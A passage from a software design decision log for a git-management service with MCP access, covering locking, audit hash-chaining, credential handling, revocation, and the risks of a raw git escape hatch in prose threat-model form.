Rejected: **A one-time setup token printed to the container logs** — the conventional shape, and it puts an unauthenticated setup route on a public origin until consumed, and depends on log access being both available and private. **OIDC-only bootstrap** — no local secret to place, and it makes the identity provider load-bearing at the one moment there is no local fallback.
Consequence: Volume access was already the ultimate authority here, via break-glass; provisioning introduces no new trust root, and adds one more thing hatch-reached code can write. That is recorded in the residual-risk consequence below rather than treated as separate.
Reversibility: cheap.

### 2026-08-03 — The lease self-test uses a real second process; the stale-lock case is named, not denied
Context: The design asserted that because the kernel releases an advisory lock on death, `SIGKILL` included, "an unclean kill leaves no stale lock to reason about" — while the brief requires stale-lock handling explicitly and definition-of-done item 9 names it. The design's own concurrency section then conceded the case where the assertion is false: a bind-mounted Windows path, where two instances can both believe they hold the lease. Worse, the mitigation offered — a second acquire from the same process must fail — tests a property of the locking API rather than of the filesystem, and can pass on the broken volume and fail on a sound one.
Chosen: Boot spawns a short-lived child that must be refused the same lock, and startup is fatal if it is granted. The bind-mount configuration is named as the stale-lock case the brief asks about, with the named-volume requirement as the answer, rather than being denied.
Rejected: **A lease heartbeat as corroborating evidence** — gives the timestamp field a purpose and would have caught a lying filesystem a second way; rejected because it reintroduces the staleness heuristic the OS lock exists to replace. **Record as known-and-retained** — accept that protection holds only on a named volume and state item 9 as satisfied by kernel release; rejected because the item explicitly names the case that reading excludes.
Consequence: The unread lease timestamp had no remaining purpose and was removed — see below.
Reversibility: cheap.

### 2026-08-03 — Recovery descriptors live in an L1 catalogue registered at composition time
Context: The acyclicity argument cut two edges carefully — `actorRef` passed by value so L1 never imports identity, and the pipeline injected into the scheduler — and missed the edge recovery actually needs. Boot compares observed state against "the operation's expected post-state" and runs "the operation's resume step", both of which are L2 domain knowledge, while the two modules that drive recovery are at L1. No module in the stated graph held that knowledge, so the first recovery implementation would have closed the cycle the CI dependency check exists to catch.
Chosen: A recovery catalogue at L1 holding per-tool descriptors — expected post-state predicate, optional resume step — keyed by registry tool name and populated by the composition root. The same mechanism as the module adapter's handler catalogue and the scheduler's injected pipeline, now used for the third time.
Rejected: **Store the expected post-state in the journal entry** — no catalogue and no registration, and resume steps still have nowhere to live, and the recorded value's correctness is checked by nothing. **Hoist recovery into the composition root** — honest about what it needs, and it widens the one path exempt from the dependency-direction check from a file into a subsystem.
Reversibility: cheap now; expensive once composites encode resume behaviour some other way.

### 2026-08-03 — Each module prunes its own rows; the maintenance pass is a schedule, not an owner
Context: The clone store owned "the maintenance pass that applies eviction and retention", and retention covers audit segments with their chain anchors, journal rows, outbox rows, store backups, expired tokens, revoked grants and clients, terminal scheduled jobs and orphaned declarations. Its declared dependencies were exec, declarations, locks, journal and audit — not the outbox, not the scheduler, and not authorization, which is at L4 and owns the tokens and grants. An L1 module was deleting L4's rows in the one place the dependency-direction check would be pointed.
Chosen: The pass is driven from the composition root with no mutation lock held and calls a `runRetention()` on each owning module in turn, then asks the clone store to evict if that was not enough. Each deletion happens where its invariants are known — audit writes its retained anchor as it drops a segment, authorization walks the revocation cascade before deleting a grant.
Rejected: **One retention module owning every window** — a single place to read the policy, and it knows the schema of tables belonging to four other modules. **Keep it in the clone store and declare the dependencies** — the smallest edit to the document, and it writes the L1→L4 edge into the layering rather than removing it.
Reversibility: cheap now.

### 2026-08-03 — Write path prefixes intersect the declaration with the acting profile
Context: The brief carries over as an inherited principle that unattended actors must not be able to unlock themselves, citing `blog-mcp`'s cron and watcher profiles stripping `.github/workflows/`, `.config/`, `tools/` and `build/` from their writable prefixes. The design had exactly one path allowlist, on the `Declaration`, shared by the operator, every MCP session and the scheduler. The principle had no representation in the data model at all, and it compounds with the knowingly-accepted `RepositoryConfig` exposure, where a caller with `git.local.write` authors the `requiredChecks` its own run waits for.
Chosen: The effective allowlist is the declaration's set intersected with the acting profile's, on the same narrowing-only principle as the capability lattice. The operator profile is unrestricted; `mcp`, `scheduler` and `watcher` strip the four prefixes.
Rejected: **A per-declaration deny list, actor-independent** — one axis instead of two, and it cannot express "the operator may edit the deploy workflow and the scheduler may not", which is the distinction the prior art actually drew. **One shared set, recording the principle as knowingly dropped** — no new field, and it hands unattended actors the operator's write surface.
Consequence: It does not close the `RepositoryConfig` exposure, which remains accepted per the ratified decision above; it keeps the two unattended profiles out of it.
Reversibility: expensive after the path predicate is written, because the actor has to be threaded into a check that currently needs only a declaration.

### 2026-08-03 — Audit appends go through a single writer inside the audit module
Context: The audit log is hash-chained — sequence number, previous line's hash, own hash over both — with the head mirrored into the structured store. Nothing serialised the appends. Mutations are globally serialised, but audit is not written only by mutations: capability rejections at dispatch are audited and happen on lock-free read paths, and the `git.raw` outcome line lands after a child that may have run for its whole timeout. Two overlapping appends read the same head, claim the same sequence number and hash over a predecessor the other did not write.
Chosen: A single-writer promise-chain queue owned by the audit module, the same mechanism as the mutation mutex and sufficient for the same reason. Sequence number, previous hash, file append and the mirrored head all happen inside it. Callers are unchanged and the best-effort contract is intact.
Rejected: **Drop the chain entirely** — the design already concedes it is defeated by service-privileged rewriting, so it only detects non-service tampering; rejected because that detection is still the strongest claim available without a second service. **A chain per stream** — avoids the race without a queue, doubles the verification surface, and leaves inter-stream ordering unprovable.
Consequence: Without this the chain diverges under ordinary unattacked load and boot reports tampering that never happened — and routine false positives are exactly how a tamper signal stops being read.
Reversibility: cheap now; the chain format is unchanged.

### 2026-08-03 — Revocation reaches queued scheduled work, checked at fire time
Context: The console claims "revoke everything and re-authenticate is one screen during an incident". Orphaning a declaration cancels its pending jobs; revoking a grant or client did not. `ScheduledJob.frozenGrant` was re-intersected at fire time against the declaration grant and the deployment ceiling, and against nothing about the creator. A compromised client's 06:00 job would fire under a grant frozen at 02:00 and revoked at 03:00 — for the one actor that runs unwatched.
Chosen: The creating grant is a fourth term in the fire-time intersection. If it or its client is revoked the intersection is empty, and the job moves to `cancelled` with a reason naming the revocation — never fired, never silently dropped.
Rejected: **Cascade at revocation time** — more visible at the moment the operator acts, and it is a written batch, where every other cascade here is deliberately check-time so there is no partially applied state to recover from. **List each grant's pending jobs in the grants view and leave cancellation manual** — no new invariant, and it depends on the operator noticing during an incident.
Reversibility: cheap.

### 2026-08-03 — The hatch's escalation inventory names console authority
Context: The residual-risk section enumerates what code reached through `git.raw` can touch — every clone, the structured store, the audit log, whatever a credential resolver resolves — and draws three consequences. It omitted the largest. Break-glass is a file on the volume; recovery-code hashes and operator credentials are rows in the store; the new provisioning file is on the volume too. Code running as the service writes any of them and authenticates at the console as the operator, with `declaration.manage`, `auth.manage`, `audit.read` and `attention.resolve`.
Chosen: State it as a fourth consequence. The structural claim that declaration and authorization management are unreachable from MCP is true of the **session model** and not of a **process** the hatch starts, and the enforced TOTP factor is no barrier on this path because the mechanisms being written are precisely the ones that exist to work around a lost factor. No mechanism changes.
Rejected: **Move break-glass and the recovery-code hashes off the volume**, to the read-only secrets mount — narrows the path materially, and it makes lockout recovery depend on the mount, while the store stays writable anyway. **Require a second factor break-glass cannot supply** — closes the escalation properly, and directly contradicts break-glass's purpose, which is the path for a lost second factor.
Consequence: This is the third time the accepted `git.raw` risk has grown without being re-decided. It is still accepted. What changed is that the written inventory now reaches the end of what the execution actually touches, which is what a future session will reason from when deciding whether to grant the capability to a repository.
Reversibility: n/a — this is a statement of an accepted position, not a mechanism.

### 2026-08-03 — A daily store snapshot, distinct from the pre-migration copy
Context: The corrupt-store failure said "refuses to start, naming the pre-migration backup". That copy is taken only before a migration, so on a store that has not migrated since the last image upgrade the newest restore point is months old — reverting every declaration, grant, token, journal entry and scheduled job written since, orphaning clones from the declarations that named them and making their in-flight work unclassifiable. The design presented this as a recovery.
Chosen: A daily snapshot on the maintenance pass, seven retained, alongside the pre-migration copy at three. Two copies for two different failures: rollback for a bad image, recovery point for corruption. The boot refusal names the snapshot **and its age**.
Rejected: **State the loss honestly and ship no new backup** — consistent with volume loss being an accepted risk, and it makes the routine corruption case as expensive as the volume loss it is not. **Treat a corrupt store as a re-provision** — no backup depended on at all, and it discards the journal, which is the one thing nothing else can reconstruct.
Consequence: Both copies are on the same volume. Volume loss remains accepted and uncovered; the wording in that section was corrected from "no online-backup operation ships" to "no off-volume backup operation ships", which is what was actually meant.
Reversibility: cheap.

### 2026-08-03 — A parked clone admits the typed write tools to a repair session
Context: The parked-operations view offered two resolutions and told the operator to "fix the tree with ordinary git operations first". There were none available: the declaration refuses mutations while parked, the console has no file view or shell, and `git.raw` is default-deny per declaration. The documented exit required host access, or granting the single most consequential field in a declaration under incident pressure — for a state reachable from every mutating operation, in a design where definition-of-done item 13 requires every terminal state to be reachable without supervision.
Chosen: A clone in `needs-attention` admits the existing typed write tools — stage, restore-paths, commit, branch — to a session holding `attention.resolve`, audited as repair, while ordinary traffic still gets reads only. No new mutation surface: the same operations under the same path allowlist the declaration permits when healthy.
Rejected: **A console file view for parked declarations** — directly addresses inspect-and-fix, and it is both the content editor the brief left open and the arbitrary-mutation route the non-goals push against. **Host access is the documented exit** — no new surface, and it fails item 13.
Reversibility: cheap.

### 2026-08-03 — Notification severity; eviction summarised per pass
Context: The storage decision above sized the volume for roughly a dozen declarations, called eviction exceptional, and fired the notifier on every eviction. The brief states repository count as unbounded and assumed to grow, and says eviction and disk-pressure handling are in scope rather than deferrable. At a hundred declarations on the same volume, eviction is steady state, and it shares its only channel with merge conflicts, failed checks and wait timeouts — so the rational operator response is to mute the channel that carries the 03:00 terminal state.
Chosen: Outbox rows carry a severity — `attention` for a terminal state a caller could not see, `info` for maintenance. A maintenance pass emits one `info` summary naming what it released rather than one notification per clone. Nothing suppresses `attention`. The sizing is restated as a premise with its scaling behaviour rather than as an assumption that eviction stays rare.
Rejected: **Drop the eviction notification entirely** — smallest change, one severity retained, and the earlier decision's argument that outgrowing the disk is worth hearing about goes unserved. **Keep per-clone notification and record the sizing as a premise** — honest, and it defers what the brief says is not deferrable.
Consequence: This narrows, but does not overturn, "Volume provisioned generously; eviction is exceptional and notifies" above. Eviction still notifies; it notifies once per pass, at a severity that can be routed.
Reversibility: cheap — the outbox already models delivery.

### 2026-08-03 — `git.raw` carries its own timeout
Context: The hatch is mutating, so it takes the estate-wide mutation mutex, and its argument vector is caller-authored. The throughput analysis bounded fetch, push and clone at 300 s each and said nothing about the hatch, so one caller could hold every repository for a duration of its own choosing, repeatedly — and the brief forbids rate limiting on the grounds that serial mutation already bounds throughput, which bounds the operator's throughput and not a caller's choice of a slow command.
Chosen: A declared timeout in the registry, well under the transfer caps. Exceeding it kills the child, returns `timeout`, and parks the journal entry, since what the command achieved before the kill is not knowable.
Rejected: **Classify raw subcommands so only remote ones take the global lock** — raises throughput materially, and it requires deciding which subcommands are local on the one surface whose premise is that its effects are not anticipated. **Record as known-and-retained** — consistent with the hatch being deliberately granted authority, and an estate-wide stall is a different thing from a per-repository one.
Reversibility: cheap.

### 2026-08-03 — The http adapter ships with published-URL verification as its consumer
Context: `MCP-NEXT.md` specifies two adapters. This design used one: every operation executes `git` or `gh` through exec behind the module adapter, and the http adapter had no caller in the git domain, the blog consumer, the scheduler or the console. It would have shipped inside the contract fingerprint — reviewed, locked and never exercised by a slice — against this design's own standard that a validator which has never failed is not known to constrain anything.
Chosen: Published-URL verification becomes its consumer. It is genuinely an HTTPS GET rather than a `gh` call, it is unauthenticated so the adapter needs no credential dependency and its L1-only dependency list stands, and it already has a classified failure set, so response mapping is exercised beyond a success case. Check and deploy status polling stay on the host adapter through `gh`.
Rejected: **Defer the adapter and keep the contract's execution-target union open** — the recommended option, and nothing unexercised would sit inside the fingerprint; not taken, because it departs from the specified two-adapter shape and makes the first http target a later contract change. **Move deploy-status polling off `gh`** — exercises the adapter hardest on real authenticated calls, and it puts credentials at L3 and cuts against keeping `gh` behind the host interface through the parity migration.
Consequence: The one deliverable-1 component with no consumer now has one, and deployment verification's final step moves off exec. `/slices` should size that move rather than treating it as review tidying.
Reversibility: cheap.

### 2026-08-03 — A watcher exists, and it watches per-declaration content drops
Context: `watcher` appeared as a `Session.kind` and as an actor contending for the mutation lock, with no module, capability, trigger, failure mode or retention policy anywhere. The brief mentions `blog-mcp`'s directory watcher only as prior art. An actor named twice and specified nowhere is either dead text or undesigned scope.
Chosen: Specify it, as headless file delivery. A directory per declaration on the volume, watched only when `Declaration.contentDrop` is present. A settled file dispatches one operation through the same pipeline as every other caller, as a `watcher` session bound to that declaration, which copies it into the working tree, stages and commits it on a branch. It does not push and does not open a pull request, so it holds no host capability and needs no credential. Rejected paths move to `rejected/` with a reason and notify at `attention`; nothing is silently discarded.
Rejected: **Remove both references and drop the actor kind** — the recommended option and the smallest design; not taken. **Watch the managed clone working trees**, as the prior art does — carries the inherited cron-and-watcher pair over literally, and it observes the service's own writes, needing a suppression rule that solved one repository and does not generalise to many. **Watch a drop directory for declarations**, GitOps-style onboarding — appealing against item 5, and declaration management is deliberately console-only and structurally so.
Consequence: This is new product scope neither deliverable asked for, accepted deliberately. It is also the newest unattended actor, which is what the per-actor prefix intersection above now covers — the watcher is structurally incapable of altering the deploy workflow, the repository config or the tooling. Its "does it commit or only stage" answer is a design call made here rather than by the brief: staging alone would leave clones permanently dirty, which fights eviction and the adoption refusal.
Reversibility: expensive as scope, cheap as mechanism — it is one L2 module with an injected pipeline.

### 2026-08-03 — `RepositoryConfig` is read at point of use; the cache is dropped
Context: The cache was keyed by declaration and `HEAD` and invalidated by "any operation that moves `HEAD` or changes the tree". Since the config is read from the working tree, an uncommitted edit leaves `HEAD` where it was — and that is not a corner case but the accepted exposure the ratified decision above describes, where a caller authors the configuration its own call reads. Correctness rested on every mutating path invalidating by hand, `git.raw` included, whose premise is that its effects are not anticipated.
Chosen: No cache. Read the file at point of use, as the credential resolver already resolves at point of use, for the same reason.
Rejected: **Key the cache on the config file's content hash** — keeps the cache and makes it correct, and the key computation is itself the file read the cache existed to avoid. **Keep the `HEAD` key and require unconditional invalidation** — smallest edit, and correctness then rests on every future handler remembering.
Consequence: This supersedes the closing note on "‘RepositoryConfig’ is read from the working tree; both guards stay declined" above, which retained the cache-invalidation rule as a correctness rule. There is now no cache to invalidate. Neither declined guard is affected.
Reversibility: cheap.

### 2026-08-03 — Journal pre-state digests the index, not the tree it would write
Context: `indexTreeHash` was defined as "the tree object the index would write", which means `git write-tree`. That has two properties the field cannot afford: it writes objects into the object database, so capturing pre-state would itself be a side effect taken before the record whose purpose is to precede the first one; and it fails on an unmerged index. The second is worse — a declaration with a conflicted index could never capture pre-state, so the intent write fails, so per the boundary table every mutating tool aborts, permanently, on the declaration that most needs an operator to reach it.
Chosen: Hash the index's own entries — path, mode, blob id, stage number. Nothing is written, conflict stages are part of what is hashed, and the field still changes exactly when the staged content changes.
Rejected: **Keep `write-tree` and make an unmerged index an explicit `precondition`** — honest about the limit, and it leaves a conflicted declaration unable to run any mutating tool until the repair session clears it. **Keep as written** — no change, and the abort path is reached before any mutation was possible.
Reversibility: cheap now, expensive once entries exist — the same reasoning that made the digest decision urgent in the third pass.

### 2026-08-03 — The HTTP API accepts a cookie session or an operator API token
Context: The brief lists three surfaces with distinct consumers, one of them "HTTP API — Me, directly". The design described two authentication paths: a browser cookie session with CSRF, and OAuth bearer tokens bound to `/mcp/{declarationId}`. Direct API use had no described credential, and the two schemes shared an origin with no statement of which routes accept which.
Chosen: Both, stated per route. A browser presents the cookie with the `Origin` check and the double-submit token. A script presents a bearer operator API token — an `operator-api` grant issued from the grants view, verified by the same stored hash and revoked in the same place. Bearer routes take no cookie and cookie routes take no bearer.
Rejected: **Cookie only, with direct use scripting a login** — one mechanism, and scripting an enforced-TOTP login for routine use is friction an operator routes around. **Direct programmatic use goes through MCP** — one authenticated surface for scripts, and it demotes a surface the brief lists as first-class.
Reversibility: cheap.

### 2026-08-03 — Removal operations exist: `clone.remove` and `declaration.remove`
Context: Both were referenced as existing — "orphaned declarations are retained until the operator removes them", "removing that clone is a separate, explicitly flagged, audited operation" — and neither appeared in `declaration.manage`, any capability, any view or the route table. Separately, a corrupt clone is refused at materialisation and cannot have the safe-to-evict predicate computed, so it was unevictable, unremovable and permanently blocking its declaration.
Chosen: Two operations under `declaration.manage`, console-only, audited. `clone.remove` refuses unless the clone is safe to release, with an explicitly flagged override that permits a corrupt tree and still refuses when commits are unreachable from `origin/<base>`. `declaration.remove` deletes an orphaned record and refuses while a clone for it remains.
Rejected: **Clone removal only** — gives disk and the adoption refusal an exit, and orphaned declaration records then never go away. **Remove the two references and treat removal as host access** — no new tools, and the adoption refusal above would have no in-product remedy.
Reversibility: cheap.

### 2026-08-03 — Smaller corrections applied without a separate decision
Context: Findings whose resolution has no rejected alternative worth preserving, recorded together so the pass is fully accounted for rather than partially.
Chosen: `generation` added to `Clone` and `Grant`, which the text already claimed carried it. Operator sessions become a persisted entity, without which server-side logout and grants-view revocation are both gestures. The unread lease timestamp is dropped, since the takeover rule reads only the lock and a periodic write nothing consumes invites a staleness heuristic later. `mutationInFlight` is scoped to the declaration being read rather than derived from a process-wide mutex, where it would be true whenever any repository in the estate was mutating. `audit.read` and a console audit view are added, without which definition-of-done item 8's attributability is checkable only with host access to the volume. The retention prose said "four" over an eight-row table while the disk-full path said "six"; the windows are now eleven, the volume consumers seven, and the two lists are stated as deliberately different. The hatch's credential channel is described as service-injected configuration, resolving an apparent contradiction with "system and global configuration disabled" — what is excluded is caller- and repository-supplied configuration, not configuration as such, and without that distinction the hatch could not reach a remote at all.
Reversibility: all cheap; the two schema additions become expensive once data exists.

### 2026-08-03 — Third redteam pass: thirteen defects fixed, one accepted risk enlarged
Context: A third `/redteam` pass, on a third vendor, against the design as repaired by the first two. Fifteen findings: thirteen genuine defects, one restatement of an accepted position, one re-raising the ratified `requiredChecks` question. Eight of the thirteen were in text written earlier the same day by the repair pass for the second review — the repairs introduced roughly as many defects as they fixed, which is the reason this entry exists rather than a note.
Chosen: Fix all thirteen. The load-bearing ones: `git.raw` operands are now allowlist-checked and remote-persisting subcommands refused, closing a **binding non-goal** the hatch violated in plain sight; `(id, generation)` replaces `id` as declaration identity, so re-declaration eras are separable by key rather than by intention; journal pre-state becomes content digests instead of clean/dirty booleans, which could classify a real side effect as a non-event; the materialisation lock is held for the whole operation by mutating callers only, resolving a contradiction the repair pass introduced between the control flow and the lock protocol; the notification outbox row is written in the same transaction as the journal settle, closing a crash window where a terminal state could never reach anyone; and tokens gain a stored verifier hash, without which item 12's reconnection could not work at all.
Rejected: **Signed tokens** — stateless verification this design never needs, at the cost of a key lifecycle and a second revocation mechanism. **Per-path journal digests** — cheaper on large repositories, and `git.raw` declares no paths, so the widest operation would get the weakest record. **Narrowing the recovery claim to clean trees only** — honest and free, and it makes the common case on a long-lived clone the manual one. **Forbidding id reuse** instead of a generation counter — no new field and no ambiguity, at the cost of stable naming and a changed resource URI.
Consequence: The accepted `git.raw` risk grew today without being re-decided. The residual-risk section already stated that hatch-reached code can read every clone, credential, grant row and audit file; making the hatch reachable from MCP by default put that within reach of prompt injection against any granted declaration, rather than the console alone. Still accepted, now recorded as enlarged.
Reversibility: mixed. The identity change and the token verifier are expensive after data exists; the rest are cheap.

### 2026-08-03 — `git.raw` is reachable from MCP; the declaration layer carries the default-deny
Context: The last open question in `10-design.md`. The design had recommended withholding the hatch from every MCP session profile and granting it to the operator console only — which, checked against the ratified brief, is the "hatch restricted to the console, never MCP" alternative that the brief had already considered and rejected. The recommendation had drifted toward a position the brief closed.
Chosen: `git.raw` sits in the deployment ceiling and MCP session profiles do not exclude it, so an agent may hold it. It stays **default-deny at the declaration layer** — `capabilityGrant` must name it explicitly and a newly declared repository does not have it. Three of the four lattice layers admit it; the per-repository one is where the decision is made.
Rejected: **Withheld from every MCP profile, console only** — the design's own prior recommendation, and console-only wearing different clothes, which the brief rejected. **On everywhere with per-declaration opt-out** — the most literal reading of "available by default for all git access", and it makes a newly declared repository immediately reachable by arbitrary git from any authorised session, which is a decision better made once per repository than inherited silently. **No per-declaration control at all** — simplest to document, and it removes the only layer still enforcing anything for this capability.
Consequence: The prompt-injection property now rests entirely on one field per repository. Where the grant is absent it is structural and intact — the tool is not in the listing, so text in a PR comment cannot summon it. Where the grant is present it is gone. `capabilityGrant` naming `git.raw` is the most consequential entry in a declaration, and the design says so where the risk is described rather than only here.
Reversibility: cheap as configuration; the property it trades away is not recoverable for any repository where the grant was live.

### 2026-08-03 — Credentials resolve from a mounted secrets directory
Context: Open question 1, the last one blocking `/contract` — the declaration format cannot be written until the reference syntax the resolver accepts is fixed. Item 5 requires onboarding by declaration alone with no restart, which rules out credentials arriving through the container environment.
Chosen: A read-only mount whose file names are reference names, matched by `^[a-z0-9][a-z0-9._-]{0,63}$`, read at point of use and passed into a child process's environment by name. No restart to onboard, no secret in the structured store (so the pre-migration backups carry none), and rotation is a file write the next operation observes — which is what lets a failing credential reference clear itself.
Rejected: **Encrypt at rest in the structured store** — one storage system instead of two and fully self-describing declarations; rejected because the store backups would then contain secrets, so backup handling inherits secret handling, and key rotation becomes its own operation. **An external secret store** — the only option with real per-reference access control, and the only one that would let per-declaration credential isolation become an enforced boundary rather than a lookup convention; rejected for now because it adds a runtime dependency an unwatched instance would depend on, and a network round trip inside every credentialed operation. Held as the upgrade path if isolation is ever promoted.
Reversibility: cheap to swap the resolver behind the interface; expensive to change the reference *syntax* once declarations exist.

### 2026-08-03 — Volume loss is an accepted risk; no online backup ships
Context: Open question 4. Item 18's rollback is covered by the pre-migration store copy, but that copy is on the same volume and protects nothing against losing it. Item 20 requires backup and recovery documentation, which requires knowing what the recovery actually is.
Chosen: Accept it, and write down exactly what it costs — clones re-cloned from remotes with unpushed work lost, declarations re-declared by hand, every MCP client re-authorising, and the audit log and journal gone. Documentation names that as the recovery path rather than describing a backup that does not exist.
Rejected: **The host snapshots the volume** — the recommended option and the cheapest if true; not taken, so nothing in the design may assume it. **An online-backup operation** — makes the service responsible for its own durability, and is scope neither the brief nor the design allocated.
Consequence: The audit trail does not survive the instance, and the hash chain cannot help — a chain proves a surviving trail was not edited, not that a destroyed one existed. This is the same requirement the deferred external audit sink would satisfy; if either is revisited, both should be, together.
Reversibility: cheap to add a backup operation later; the data lost before that point is not recoverable.

### 2026-08-03 — Console views are parameterised by the selected repository, never bound to one
Context: Open question 5. Under the lattice a view renders for the selected repository when its grant permits, which implies parameterising it — but `ComposeView` is 38 KB of repository-implicit code, and pinning the blog views to the blog declaration is defensible because blog authoring genuinely applies to exactly one repository.
Chosen: A registered view receives the selected declaration and never declares one it belongs to. One rule in the seam, answered by capabilities alone.
Rejected: **Pin views to a declaration** — much less work, and it puts a second mechanism into the seam competing with the capabilities that already answer "may this render here", which every future consumer would then have to learn. **Support both, with blog pinning initially** — most flexible, and it ships two answers to one question before either is proven.
Reversibility: expensive — it is the shape of a seam published as a versioned package to consumer builds.

### 2026-08-03 — One notification transport: an HTTP webhook
Context: Open question 3. The brief put outbound notification in scope with the mechanism undecided, because an unwatched run stopping at a terminal state has to be able to reach the operator.
Chosen: An HTTP webhook, and only that. It covers Slack, Discord, Teams and most else that accepts an incoming hook, and it is what the design already assumed.
Rejected: **Webhook plus an email relay** — email reaches you when a chat client is closed overnight, which is exactly the 03:00 case; rejected for now as SMTP configuration and a second delivery path for a benefit one webhook already mostly provides. **Ship the interface and decide at deployment** — honest, and it defers a question that is cheap to answer now.
Reversibility: cheap — the outbox already models delivery, so a second transport is additive.

### 2026-08-03 — The audit log is hash-chained: tamper-evident, not tamper-proof
Context: Open question 5, raised when triaging the first redteam pass. Item 8 wants hatch use attributable, and `git.raw` is the one surface that can rewrite the log recording it. The answer had to land before `/contract`, because it fixes the audit line format and retrofitting a chain over a written trail is a migration.
Chosen: A per-line hash chain — sequence number, previous line's hash, own hash over the canonical serialisation plus that previous hash — spanning rotated segments, with the chain head mirrored into the structured store and verified end to end at boot. A broken chain is reported and never fatal, because refusing to start on a corrupt trail would hand anyone able to corrupt it a denial of service. The claim is precise: truncation and edited lines are detectable; a service-privileged rewrite of both the log and the mirrored head is not, so this is detection rather than prevention.
Rejected: **An external append-only sink** — genuinely tamper-proof rather than tamper-evident, and it survives volume loss too; deferred because it adds a deployment dependency the brief never scoped and makes an unwatched instance depend on a second service being reachable. Worth revisiting if such a target ever exists. **Accept refusal-time attributability as the whole claim** — free and honest, and it leaves item 8 claiming materially less than it appears to for the one surface that can rewrite its own evidence. **Refuse to start on a broken chain** — the strongest reading of an audit guarantee, and a self-inflicted outage trigger.
Reversibility: cheap now, expensive once lines exist — which is exactly why it was answered before `/contract`.

### 2026-08-03 — Volume provisioned generously; eviction is exceptional and notifies
Context: Open question 6. The eviction machinery, the watermark values and the four retention windows all depended on a number only the operator has.
Chosen: A volume of the order of 100 GB for roughly a dozen declarations — several times the working set. Watermarks at 85 % (request a maintenance pass, retention first, eviction only if that was not enough) and 95 % (refuse operations needing space). Eviction fires the notifier, because at this sizing a released clone means the estate is outgrowing its disk rather than that housekeeping ran. Retention defaults: audit 90 days at 64 MB segments, settled journal 30 days, delivered outbox 14 days, three pre-migration backups. All four are configuration.
Rejected: **Tight volume with routine eviction** — right for a small or shared volume, and it makes unpinned clones re-clone often, paying network time on first use and making eviction ordinary enough that its notification would become noise. **A volume so large eviction never fires** — simplest operationally, and it leaves the eviction path untested until the day it finally runs, which by then is the worst day to discover it.
Reversibility: cheap — every value is configuration, and the interlock's behaviour does not change with the thresholds.

### 2026-08-03 — The lock protocol is four rules, not one ordering
Context: The design's deadlock argument rested entirely on "materialisation before mutation, never the reverse". Review found the design's own disk-pressure path violating it: the watermark check fires after each mutation, eviction is covered by the materialisation mutex, so the post-mutation check acquires materialisation after mutation. Bounded waits would have degraded the resulting cycle into spurious `conflict`s rather than a hang, which is worse — the failure would have looked like contention, at disk pressure, in production.
Chosen: Four rules. The order stands; a caller holds the materialisation lock for the whole operation and releases in reverse; eviction never runs while the global mutation lock is held, so the watermark check requests a maintenance pass instead of evicting inline; and eviction refuses while a per-declaration active-operation count is non-zero. The counter is a non-blocking pin, not a third lock.
Rejected: **Order alone** — what the document said, and it is unsound. **Release the materialisation lock after the ensure step** — the intuitive scope for it, and it opens a window where eviction removes a clone between the ensure and the journal write, producing an intent record with an unre-derivable pre-state. **Make reads take the materialisation lock** — closes the read-versus-eviction race correctly and reintroduces exactly the blocking the read exemption exists to remove.
Reversibility: expensive — the clone store, dispatch, journal recovery and the eviction interlock are all written against it.

### 2026-08-03 — An unmaterialised declaration is servable; the concurrency argument was wrong, not the control flow
Context: Two statements could not both be implemented. The concurrency section justified concurrent clone-of-A-with-mutation-of-B by asserting no session can name a declaration until its clone is `ready`; the control flow made a session's `tools/call` the thing that triggers the clone.
Chosen: The control flow reading, because definition-of-done item 5 forces it — clone-on-demand means the call is the trigger, and the other reading leaves headless onboarding with no trigger at all. The safety argument is redone on the real property: a clone takes only that declaration's materialisation lock and never the global mutation lock. Discovery against a treeless declaration is now analysed rather than assumed away, and three states are distinguished — no clone, materialising, and `recovery-pending`.
Rejected: **Keep the unservable reading and add an explicit materialise operation** — restores the original safety argument verbatim, and it fails item 5's "a running instance picks it up and clones it" by requiring an operator step the item exists to remove.
Reversibility: cheap now, expensive once session establishment, discovery filtering and the clone store each encode an answer independently.

### 2026-08-03 — Grants, tokens and revocation are modelled; a grant epoch makes a frozen session narrowable
Context: Durable grants are definition-of-done item 12's headline departure and item 20 requires revocation documentation, yet OAuth clients, grants and tokens appeared once as a phrase in a storage-kinds row and were never modelled. No revocation existed anywhere — no capability, route, view or entity. Combined with a session grant frozen for the session's lifetime, the operator's only revocation mechanism during an incident was restarting the container.
Chosen: Three entities with `revokedAt` timestamps rather than deletes, cascade evaluated at check time, plus a `grantEpoch` per declaration that dispatch compares against the epoch a session froze at. A moved epoch forces a recomputation that can only narrow, so both properties hold at once: nothing at runtime widens a live session, and a revocation lands on the very next call. Revocation is console-only under a new `auth.manage`.
Rejected: **Recompute the grant on every call** — simplest, and it discards the prior art's fixed-at-`initialize` rule, letting a widened declaration grant reach a live session. **Keep the freeze and accept revocation-at-session-end** — what the document said, and it is a hole exactly where it matters operationally. **Delete revoked rows** — smaller store, and a store that forgets what was revoked cannot answer the question the revocation was raised to answer.
Reversibility: expensive — revocation cuts across authorization, session lifecycle, the store schema, the console and the contract.

### 2026-08-03 — The global mutation mutex stays; the throughput ceiling is stated instead
Context: Fetch and push take the global mutex, and the lock table claimed a hold time of "milliseconds to seconds" — false for a network transfer, and unenforced, since only the clone had a cap. At a hundred declarations a one-line commit can queue behind a transfer on an unrelated repository.
Chosen: Keep global serialisation. Correct the table, give fetch and push their own 300 s caps, and record the ceiling as an honest limit naming the condition to revisit it.
Rejected: **Per-declaration mutation locks** — raises throughput and breaks the invariant every other part of the design is written against, that a crash leaves exactly one half-done operation, which is what makes recovery classification tractable. Revisit only with that invariant reopened. **Leave the column as written** — an unenforced assertion that reads as a guarantee.
Reversibility: expensive to change later, which is why the revisit condition is named rather than left implicit.

### 2026-08-03 — Boot starts transports before recovering; recovery is per-declaration and lazy
Context: The boot path re-derived every clone's state and ran the recovery pass for every declaration before transports started, both involving git subprocesses per clone. At a few hundred clones a restart means minutes of total unavailability, to recover state concerning at most one declaration — so the thing the journal makes safe becomes the thing the operator avoids.
Chosen: Readiness and transports first. A declaration with unsettled entries is `recovery-pending`, serves reads, refuses mutations, and recovers on first use or a background sweep. Boot also gained a pending-scheduled-job re-validation sweep, so an image upgrade that renames a tool or changes a schema surfaces next to the fingerprint checks that caused it rather than weeks later at fire time.
Rejected: **Eager recovery before readiness** — the stronger guarantee, kept where it is load-bearing (no mutation on an unrecovered declaration) and dropped where it was only tidy.
Reversibility: expensive — servability, readiness semantics and the `needs-attention` blocking model move together.

### 2026-08-03 — `RepositoryConfig` is read from the working tree; both guards stay declined
